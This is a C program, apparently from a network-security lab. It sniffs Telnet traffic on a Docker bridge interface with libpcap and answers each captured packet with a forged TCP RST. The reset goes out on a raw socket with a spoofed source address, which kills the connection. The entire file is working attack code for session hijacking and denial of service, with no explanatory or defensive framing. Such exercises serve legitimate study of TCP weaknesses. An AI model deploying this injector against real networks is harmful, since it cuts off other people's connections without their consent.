#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <netdb.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pcap/pcap.h>

#define PACKET(Name, Header_T)                                                 \
	typedef struct {                                                           \
		Header_T header;                                                       \
		u_char data[];                                                         \
	} Name

PACKET(eth_t, struct ether_header);
PACKET(ip_t, struct iphdr);
PACKET(tcp_t, struct tcphdr);

unsigned short in_checksum(unsigned short *data, int length) {
	unsigned short *curr = data;
	unsigned int sum = 0;

	while (length > 1) {
		sum += *curr++;
		length -= 2;
	}

	if (length == 1) {
		unsigned short temp = 0;
		*(u_char *)&temp = *(u_char *)curr;
		sum += temp;
	}

	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

typedef struct {
	uint32_t src_addr;
	uint32_t dst_addr;
	uint8_t _placeholder;
	uint8_t protocol;
	uint16_t tcp_len;
} psh_t;

u_char packet_buffer[4096] = {0};
u_char tcp_psuedo_buff[4046] = {0};

void send_reset_packet(const char *target_ip, u_short target_port,
					   const char *source_ip, u_short source_port,
					   u_long seq_number) {
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	int one = 1;

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

	ip_t *ip_pkt = (ip_t *)packet_buffer;

	ip_pkt->header.saddr = arc4random();

	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(target_port);
	sin.sin_addr.s_addr = inet_addr(target_ip);

	ip_pkt->header.ihl = 5;
	ip_pkt->header.version = 4;
	ip_pkt->header.tos = 0;
	ip_pkt->header.tot_len = htons(sizeof(ip_t) + sizeof(tcp_t));
	ip_pkt->header.id = htons(42069);
	ip_pkt->header.frag_off = 0;
	ip_pkt->header.ttl = 255;
	ip_pkt->header.protocol = IPPROTO_TCP;
	ip_pkt->header.check = 0;
	ip_pkt->header.saddr = inet_addr(source_ip);
	ip_pkt->header.daddr = sin.sin_addr.s_addr;

	tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;

	tcp_pkt->header.source = htons(source_port);
	tcp_pkt->header.dest = htons(target_port);
	tcp_pkt->header.seq = htonl(seq_number);
	tcp_pkt->header.ack_seq = 0;
	tcp_pkt->header.doff = 5;

	tcp_pkt->header.th_flags = TH_RST;
	tcp_pkt->header.check = 0;
	tcp_pkt->header.urg_ptr = 0;

	psh_t *tcp_chksum_buff = (psh_t *)tcp_psuedo_buff;
	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_chksum_buff->src_addr = ip_pkt->header.saddr;
	tcp_chksum_buff->dst_addr = ip_pkt->header.daddr;
	tcp_chksum_buff->_placeholder = 0;
	tcp_chksum_buff->protocol = IPPROTO_TCP;
	tcp_chksum_buff->tcp_len = htons(sizeof(tcp_t));

	int transmit_len = sizeof(ip_t) + sizeof(tcp_t);

	ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));

	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_pkt->header.check =
		in_checksum((u_short *)tcp_psuedo_buff, sizeof(psh_t) + sizeof(tcp_t));

	sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
		   sizeof(sin));

	close(sock);
}

void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
			   const u_char *packet) {
	eth_t *link_pkt = (eth_t *)packet;

	if (ntohs(link_pkt->header.ether_type) == ETHERTYPE_IP) {
		ip_t *ip_pkt = (ip_t *)link_pkt->data;

		char src_ip[INET_ADDRSTRLEN];
		char dst_ip[INET_ADDRSTRLEN];

		inet_ntop(AF_INET, &ip_pkt->header.saddr, src_ip, INET_ADDRSTRLEN);
		inet_ntop(AF_INET, &ip_pkt->header.daddr, dst_ip, INET_ADDRSTRLEN);
		struct protoent *proto = getprotobynumber(ip_pkt->header.protocol);

		if (ip_pkt->header.protocol == IPPROTO_TCP) {
			tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;

			u_short src_port = ntohs(tcp_pkt->header.source);
			u_short dst_port = ntohs(tcp_pkt->header.dest);
			u_long seq = ntohl(tcp_pkt->header.seq);

			printf("Reset (src=%s:%hu, dst=%s:%hu) with sequence number %lu\n",
				   src_ip, src_port, dst_ip, dst_port, seq);

			send_reset_packet(src_ip, src_port, dst_ip, dst_port, seq);
		}
	}
}

#define LOG_ON_ERROR(exp, handle)                                              \
	if (exp != 0) {                                                            \
		pcap_perror(handle, "Error: ");                                        \
		exit(EXIT_FAILURE);                                                    \
	}

void apply_filter(pcap_t *handle, char *filter_exp) {
	struct bpf_program fp;
	bpf_u_int32 net;

	pcap_compile(handle, &fp, filter_exp, 1, net);
	LOG_ON_ERROR(pcap_setfilter(handle, &fp), handle);
}

char *find_bridge_interface(pcap_if_t *alldevsp) {
	pcap_if_t *current = alldevsp;

	while (current != NULL) {
		if (current->name != NULL) {
			if (strncmp(current->name, "br-", 3) == 0) {
				return current->name;
			}
		}
		current = current->next;
	}

	return NULL;
}

int main() {
	pcap_if_t *alldevsp = NULL;
	char err_buff[PCAP_ERRBUF_SIZE] = {0};

	pcap_findalldevs(&alldevsp, err_buff);
	char *bridge_iface = find_bridge_interface(alldevsp);

	pcap_t *handle = pcap_open_live(bridge_iface, 262144, 1, 1000, err_buff);
	apply_filter(handle, "tcp src port 23");

	printf("Running on interface %s\n", bridge_iface);

	pcap_loop(handle, -1, sniff_tcp, NULL);

	pcap_close(handle);
}
